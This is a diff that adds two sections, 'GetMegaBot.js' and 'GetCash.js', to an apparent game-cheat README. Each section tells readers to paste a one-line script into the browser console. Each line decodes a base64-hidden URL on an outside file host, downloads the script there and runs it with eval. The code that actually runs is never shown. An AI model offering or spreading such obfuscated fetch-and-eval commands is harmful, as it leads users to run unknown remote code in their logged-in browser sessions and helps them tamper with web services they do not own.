@@ -52,6 +52,18 @@ fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2Fk
 
 ## Factory 
 
+## <a id="GetMegaBot"></a>GetMegaBot.js
+
+Open console (ctrl + shift + j) and paste the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2ZhY3RvcnlHZXRNZWdhQm90Lmpz')).then((res) => res.text().then((t) => eval(t)))
+```
+## <a id="GetCash"></a>GetCash.js
+
+Open console (ctrl + shift + j) and past the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2ZhY3RvcnlHZXRDYXNoLmpz')).then((res) => res.text().then((t) => eval(t)))
+```
 
 
 
